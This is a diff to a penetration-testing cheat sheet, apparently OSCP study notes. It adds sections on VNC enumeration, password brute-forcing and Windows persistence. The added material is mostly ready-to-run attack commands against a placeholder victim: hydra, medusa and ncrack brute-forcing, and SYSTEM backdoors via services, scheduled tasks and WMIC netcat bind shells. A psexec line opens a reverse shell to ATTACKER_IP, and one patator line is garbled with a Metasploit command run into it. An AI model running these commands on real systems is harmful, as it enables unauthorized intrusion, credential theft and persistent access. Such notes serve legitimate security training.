@@ -33,15 +33,17 @@ Other great cheetsheets:
     - [3.12.1. MySQL UDF Exploit](#3121-mysql-udf-exploit)
     - [3.12.2. Grabbing MySQL Passwords](#3122-grabbing-mysql-passwords)
     - [3.12.3. Useful MySQL Files](#3123-useful-mysql-files)
+  - [3.13. 5900 - VNC Enumeration](#313-5900---vnc-enumeration)
 - [4. Exploitation](#4-exploitation)
   - [4.1. Searchsploit](#41-searchsploit)
   - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
     - [4.2.1. Cracking with John The Ripper](#421-cracking-with-john-the-ripper)
-    - [4.2.2. MS SQL Server Bruteforcing](#422-ms-sql-server-bruteforcing)
-    - [4.2.3. SMB Bruteforcing](#423-smb-bruteforcing)
-    - [4.2.4. SSH Bruteforcing](#424-ssh-bruteforcing)
-    - [4.2.5. Web Form (HTTP POST) Bruteforcing](#425-web-form-http-post-bruteforcing)
-    - [4.2.6. Zip File Password Cracking](#426-zip-file-password-cracking)
+    - [4.2.2. Cracking with Hashcat](#422-cracking-with-hashcat)
+    - [4.2.3. MS SQL Server Bruteforcing](#423-ms-sql-server-bruteforcing)
+    - [4.2.4. SMB Bruteforcing](#424-smb-bruteforcing)
+    - [4.2.5. SSH Bruteforcing](#425-ssh-bruteforcing)
+    - [4.2.6. Web Form (HTTP POST) Bruteforcing](#426-web-form-http-post-bruteforcing)
+    - [4.2.7. Zip File Password Cracking](#427-zip-file-password-cracking)
   - [4.3. Port Knocking](#43-port-knocking)
   - [4.4. Reverse Shells](#44-reverse-shells)
     - [4.4.1. Covering your tracks](#441-covering-your-tracks)
@@ -68,6 +70,7 @@ Other great cheetsheets:
     - [5.4.1. Windows AMSI Bypass](#541-windows-amsi-bypass)
     - [5.4.2. Turn off Windows Firewall](#542-turn-off-windows-firewall)
     - [5.4.3. Windows LOLBAS Encoding/Decoding](#543-windows-lolbas-encodingdecoding)
+    - [5.4.4. Execute Inline Tasks with MSBuild.exe](#544-execute-inline-tasks-with-msbuildexe)
   - [5.5. Windows UAC Bypass](#55-windows-uac-bypass)
   - [5.6. Windows Pass-The-Hash](#56-windows-pass-the-hash)
   - [5.7. Windows Token Impersonation](#57-windows-token-impersonation)
@@ -108,9 +111,14 @@ Other great cheetsheets:
   - [7.5. Data Wrangling on Linux](#75-data-wrangling-on-linux)
     - [7.5.1. Awk & Sed](#751-awk--sed)
 - [8. Windows Persistence](#8-windows-persistence)
-  - [8.1. Add RDP User](#81-add-rdp-user)
-  - [8.2. Connect to Windows RDP](#82-connect-to-windows-rdp)
-  - [8.3. Change Windows Domain Credentials](#83-change-windows-domain-credentials)
+  - [8.1. Remote SYSTEM Backdoor](#81-remote-system-backdoor)
+    - [8.1.1. Using Windows Services](#811-using-windows-services)
+    - [8.1.2. Using PSExec](#812-using-psexec)
+    - [8.1.3. Using Scheduled Tasks](#813-using-scheduled-tasks)
+  - [8.2. Remote Admin Backdoor via WMIC](#82-remote-admin-backdoor-via-wmic)
+  - [8.3. Add RDP User](#83-add-rdp-user)
+  - [8.4. Connect to Windows RDP](#84-connect-to-windows-rdp)
+  - [8.5. Change Windows Domain Credentials](#85-change-windows-domain-credentials)
 - [9. Linux Persistence](#9-linux-persistence)
   - [9.1. Grant passwordless sudo access](#91-grant-passwordless-sudo-access)
 - [10. Pivoting and Redirection](#10-pivoting-and-redirection)
@@ -131,13 +139,16 @@ If using scripts, you can get script help by `nmap --script-help="nfs-*"`.
 ```sh
 # preferred initial scan:
 # verbose, no DNS resolution, default scripts/enumerate versions/detect OS/traceroute, output all formats
-mkdir nmap; nmap -v -n -A -oA nmap/initial-scan VICTIM_IP
+mkdir -p scans/nmap; cd scans; nmap -v -n -A -oA nmap/initial-scan VICTIM_IP
 
 # all TCP ports, fast discovery, then script scan:
 # verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
 VICTIM=VICTIM_IP
 ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
 nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all $VICTIM
+
+# top 20 UDP ports
+sudo nmap -n -v -sU --top-ports=20 --reason -oA nmap/udp-top20 -T4 VICTIM_IP
 
 # specifying safe and wildcard ftp-* scripts
 # logic: and, or, not all work. "," is like "or"
@@ -260,9 +271,10 @@ PHP 5.x is vulnerable to Shellshock!
 
 ```sh
 # Gobuster
-gobuster dir -u http://VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt -t 50 -k -o gobuster-common.txt
+gobuster dir -eku http://VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt -t 50 -x "txt,html,php,asp,aspx,jsp" -o gobuster-common.txt
 # user-agent:
 # -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
+# other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
 ## 3.5. 88/749 Kerberos Enumeration
@@ -364,11 +376,17 @@ smbmap -H VICTIM_IP
 # list (only) windows version
 smbmap -vH VICTIM_IP
 
+# recursively list directory contents
+smbmap -RH VICTIM_IP
+
+# try executing a command using wmi (can try psexec with '--mode psexec')
+smbmap -x 'ipconfig' VICTIM_IP
+
 # standard scan
 enum4linux VICTIM_IP
 
 # scan all the things
-enum4linux -a VICTIM_IP
+enum4linux -aMld VICTIM_IP | tee enum4linux.log
 
 # nmap script scans
 nmap --script="safe and smb-*" -n -v -p 445 VICTIM_IP
@@ -637,6 +655,24 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
   - update.log
   - common.log
 
+## 3.13. 5900 - VNC Enumeration
+
+VNC is a graphical remote desktop sharing system. Other ports involved in it
+are: 5800,5801,5900,5901
+
+```sh
+# nmap scan
+nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 VICTIM_IP
+
+# connect ('-passwd passwd.txt' to use password file)
+vncviewer VICTIM_IP
+
+# bruteforcing
+hydra -L user.txt –P pass.txt -s PORT vnc://VICTIM_IP
+medusa -h VICTIM_IP –u root -P pass.txt –M vnc
+ncrack -V --user root -P pass.txt VICTIM_IP:PORT
+patator vnc_login host=VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
+```
 # 4. Exploitation
 
 ## 4.1. Searchsploit
@@ -675,7 +711,7 @@ john --restore
 john --show --format=nt hashfile
 ```
 
-### Cracking with Hashcat
+### 4.2.2. Cracking with Hashcat
 
 When to use hashcat:
 - You have a hash type that john doesn't understand
@@ -715,7 +751,7 @@ does, nor does it automatically reverse the usernames. To do this, you have to
 manually add the usernames as an additional wordlist file, and add mangling
 rules.
 
-### 4.2.2. MS SQL Server Bruteforcing
+### 4.2.3. MS SQL Server Bruteforcing
 
 ```sh
 # Be carefull with the number of password in the list, this could lock-out accounts
@@ -726,14 +762,14 @@ medusa -h VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts VICTIM_IP
 ```
 
-### 4.2.3. SMB Bruteforcing
+### 4.2.4. SMB Bruteforcing
 
 ```sh
 nmap --script smb-brute -p 445 VICTIM_IP
 hydra -l Administrator -P passwords.txt -t 1 VICTIM_IP smb
 ```
 
-### 4.2.4. SSH Bruteforcing
+### 4.2.5. SSH Bruteforcing
 
 ```sh
 # using hydra
@@ -750,7 +786,7 @@ ncrack -p 22 --user root -P passwords.txt VICTIM_IP [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
 ```
 
-### 4.2.5. Web Form (HTTP POST) Bruteforcing
+### 4.2.6. Web Form (HTTP POST) Bruteforcing
 
 ```sh
 # using hydra
@@ -762,7 +798,7 @@ medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
 hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
 ```
 
-### 4.2.6. Zip File Password Cracking
+### 4.2.7. Zip File Password Cracking
 
 ```sh
 # using fcrackzip
@@ -1143,7 +1179,7 @@ certutil --decodehex encoded_hexadecimal_InputFileName
 certutil.exe -hashfile somefile.txt MD5
 ```
 
-### Execute Inline Tasks with MSBuild.exe
+### 5.4.4. Execute Inline Tasks with MSBuild.exe
 
 MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
 C#/.NET code inline. Modify the XML file below with your shellcode from
@@ -2163,7 +2199,11 @@ sed '/PAT1/,/PAT2/!d;//d' FILE
 
 # 8. Windows Persistence
 
-## Remote SYSTEM Backdoor via Windows Service
+## 8.1. Remote SYSTEM Backdoor
+
+These techniques require having Admin credentials for the target machine.
+
+### 8.1.1. Using Windows Services
 
 ```bat
 :: You must establish SMB session with admin creds first!!
@@ -2181,7 +2221,44 @@ sc \\VICTIM_NAME start scvhost
 sc \\VICTIM_NAME delete scvhost
 ```
 
-## Remote Admin Bacdoor via WMIC
+### 8.1.2. Using PSExec
+
+NOTE: SysInternals PSExec leaves a copy of the service on the machine after
+you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
+The Metasploit module and nmap NSE script clean up the service for you.
+
+```bat
+:: '-c' passes copy of command to remote systsem even if not already present
+:: '-s' runs command as systsem
+:: '-d' runs command in detached mode. Use if you want PSExec to run something
+:: in the background (won't wait for process to finish, nor passs input/output
+:: back to caller).
+psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
+:: If username and password are omitted, psexec uses current user's creds on
+:: the remote machine.
+```
+
+### 8.1.3. Using Scheduled Tasks
+
+```bat
+:: schtasks ("/ru system" runs as system)
+schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
+:: frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle
+
+:: query schtasks
+schtasks /query /s VICTIM_IP
+
+:: delete schtask ('/f' to force)
+schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME
+
+:: at (deprecated on newer machines, but still should work)
+at \\VICTIM_IP HH:MM[A|P] COMMAND
+
+:: query at
+at \\VICTIM_IP
+```
+
+## 8.2. Remote Admin Backdoor via WMIC
 
 ```bat
 :: create admin bind-shell backdoor. Use '-d' for it to run without window
@@ -2191,7 +2268,7 @@ wmic process call create "c:\temp\nc.exe -dlp 22222 -e cmd.exe"
 wmic process where name="nc.exe" delete
 ```
 
-## 8.1. Add RDP User
+## 8.3. Add RDP User
 
 ```bat
 net user hacker P@$$w0rd /add
@@ -2205,13 +2282,15 @@ net user hacker /del
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 ```
 
-## 8.2. Connect to Windows RDP
+## 8.4. Connect to Windows RDP
 
 ```sh
-xfreerdp /u:username /p:password +clipboard /cert:ignore /size:960x680 /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot /v:VICTIM_IP
+xfreerdp /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:VICTIM_IP
+# to attach a drive, use:
+# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
 ```
 
-## 8.3. Change Windows Domain Credentials
+## 8.5. Change Windows Domain Credentials
 
 If you want to change the password of a user on a windows domain:
 
